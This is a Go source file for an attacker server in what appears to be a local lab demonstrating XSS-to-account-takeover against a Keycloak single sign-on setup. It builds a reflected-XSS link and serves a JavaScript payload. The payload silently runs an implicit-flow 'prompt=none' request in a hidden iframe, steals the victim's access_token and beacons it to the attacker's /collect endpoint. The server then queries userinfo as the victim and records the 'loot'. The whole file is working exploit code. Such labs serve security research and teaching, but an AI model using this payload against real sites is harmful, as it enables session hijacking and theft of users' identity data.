// Attacker server for Scenario 1.
//
// Delivers a reflected-XSS payload to the victim RP (http://127.0.0.1:8101).
// The payload runs in the RP's origin, opens a silent `response_type=token`
// (implicit) `prompt=none` request to Keycloak, and reads the victim's
// `access_token` back out of the URL fragment. The token is exfiltrated here;
// we then call Keycloak's userinfo endpoint to prove we are now the victim.
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
)

const (
	attackerAddr = "127.0.0.1:9101"
	rpSearch     = "http://127.0.0.1:8101/search"
	kcUserinfo   = "http://127.0.0.1:8080/realms/xss-ato/protocol/openid-connect/userinfo"
)

var (
	mu   sync.Mutex
	loot []string
)

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", home)
	mux.HandleFunc("/payload.js", payloadJS)
	mux.HandleFunc("/collect", collect)
	mux.HandleFunc("/loot", showLoot)

	log.Printf("[s1 attacker] listening on http://%s", attackerAddr)
	log.Fatal(http.ListenAndServe(attackerAddr, mux))
}

func home(w http.ResponseWriter, r *http.Request) {
	inject := `<script src="http://127.0.0.1:9101/payload.js"></script>`
	link := rpSearch + "?q=" + urlEscape(inject)
	fmt.Fprintf(w, `<!doctype html><meta charset="utf-8">
<h1>Scenario 1 - attacker</h1>
<p>1. Make sure the victim has an active Keycloak session (log in once at
   <a href="http://127.0.0.1:8101/login">the RP</a> as <code>victim</code>).</p>
<p>2. Send the victim this link (reflected XSS in the RP's <code>/search</code>):</p>
<p><a href="%s">%s</a></p>
<p>3. Watch this server's console, then open <a href="/loot">/loot</a>.</p>
<hr><h3>Injected payload</h3><pre>%s</pre>`,
		htmlEscape(link), htmlEscape(link), htmlEscape(payloadSrc))
}

func payloadJS(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	fmt.Fprint(w, payloadSrc)
}

// The SSO gadget. Runs in the RP origin (127.0.0.1:8101).
const payloadSrc = `
(function () {
  // Implicit-flow authorization request: token comes straight back in the
  // fragment. prompt=none -> zero UI when the victim already has a session.
  var authURL =
    "http://127.0.0.1:8080/realms/xss-ato/protocol/openid-connect/auth" +
    "?client_id=s1-implicit" +
    "&response_type=token" +
    "&response_mode=fragment" +
    "&scope=" + encodeURIComponent("openid profile email") +
    "&redirect_uri=" + encodeURIComponent("http://127.0.0.1:8101/callback") +
    "&prompt=none" +
    "&nonce=" + Math.random().toString(36).slice(2) +
    "&state=" + Math.random().toString(36).slice(2);

  var f = document.createElement("iframe");
  f.style.position = "absolute"; f.style.left = "-9999px";
  f.width = 1; f.height = 1;
  f.src = authURL;
  f.onload = function () {
    var hash;
    try { hash = f.contentWindow.location.hash; } catch (e) {
      console.log("[xss] cannot read iframe (still on IdP origin?)", e); return;
    }
    var p = new URLSearchParams(hash.replace(/^#/, ""));
    var at = p.get("access_token");
    if (!at) {
      // e.g. #error=login_required  -> victim has no active Keycloak session
      var err = p.get("error") || ("unexpected fragment: " + hash);
      console.log("[xss] no access_token:", err);
      new Image().src = "http://127.0.0.1:9101/collect?error=" + encodeURIComponent(err);
      return;
    }
    console.log("[xss] stole access_token:", at.slice(0, 24) + "...");
    var img = new Image();
    img.src = "http://127.0.0.1:9101/collect?access_token=" + encodeURIComponent(at);
  };
  document.body.appendChild(f);
})();
`

func collect(w http.ResponseWriter, r *http.Request) {
	if e := r.URL.Query().Get("error"); e != "" {
		msg := "gadget FAILED: " + e +
			"\n  -> the victim has no active Keycloak session." +
			"\n  -> open http://127.0.0.1:8101/login as victim/victim first," +
			"\n     then re-open the XSS link. Also run keycloak/setup.sh if" +
			"\n     login itself says \"Invalid username or password\"."
		log.Println("[s1 attacker]", msg)
		mu.Lock()
		loot = append(loot, msg)
		mu.Unlock()
		fmt.Fprint(w, "noted")
		return
	}
	at := r.URL.Query().Get("access_token")
	if at == "" {
		http.Error(w, "no token", http.StatusBadRequest)
		return
	}
	log.Println("==================================================")
	log.Println("[s1 attacker] captured victim access_token:")
	log.Println(at)

	who := callUserinfo(at)
	entry := "access_token (truncated): " + at[:min(40, len(at))] + "...\nuserinfo: " + who
	mu.Lock()
	loot = append(loot, entry)
	mu.Unlock()
	log.Println("[s1 attacker] userinfo as victim:", who)
	log.Println("==================================================")
	fmt.Fprint(w, "ok")
}

func callUserinfo(at string) string {
	req, _ := http.NewRequest(http.MethodGet, kcUserinfo, nil)
	req.Header.Set("Authorization", "Bearer "+at)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var m map[string]any
	if json.Unmarshal(b, &m) == nil {
		nice, _ := json.MarshalIndent(m, "", "  ")
		return string(nice)
	}
	return resp.Status + " " + string(b)
}

func showLoot(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	if len(loot) == 0 {
		fmt.Fprint(w, "nothing captured yet")
		return
	}
	for i, e := range loot {
		fmt.Fprintf(w, "--- capture %d ---\n%s\n\n", i+1, e)
	}
}

func urlEscape(s string) string {
	out := ""
	for _, c := range []byte(s) {
		if c == ' ' {
			out += "%20"
			continue
		}
		if c == '"' {
			out += "%22"
			continue
		}
		if c == '<' {
			out += "%3C"
			continue
		}
		if c == '>' {
			out += "%3E"
			continue
		}
		out += string(c)
	}
	return out
}

func htmlEscape(s string) string {
	r := ""
	for _, c := range s {
		switch c {
		case '<':
			r += "&lt;"
		case '>':
			r += "&gt;"
		case '&':
			r += "&amp;"
		default:
			r += string(c)
		}
	}
	return r
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
